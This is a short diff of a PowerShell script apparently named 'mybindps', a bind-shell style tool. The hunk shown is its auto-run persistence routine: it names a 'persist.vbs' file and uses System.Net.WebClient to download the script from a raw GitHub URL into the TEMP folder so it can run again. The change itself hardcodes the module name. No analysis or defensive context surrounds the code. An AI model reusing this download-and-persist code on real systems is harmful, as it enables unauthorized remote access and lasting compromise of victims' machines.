@@ -61,8 +61,8 @@ function mybindps
 	#enable auto  run 
 				 $name = "persist.vbs"         
 				#Out-File -InputObject $all -Force $env:TEMP\$modulename    
-				$modulename = $script:MyInvocation.MyCommand.Name
-				 $webclient = New-Object System.Net.WebClient
+				$modulename = "mybindps.ps1"
+				$webclient = New-Object System.Net.WebClient
 				$file = "$env:temp\$modulename"
 				$webclient.DownloadFile("https://raw.githubusercontent.com/xingkong123600/TT/master/mybindps.ps1","$file")
 			
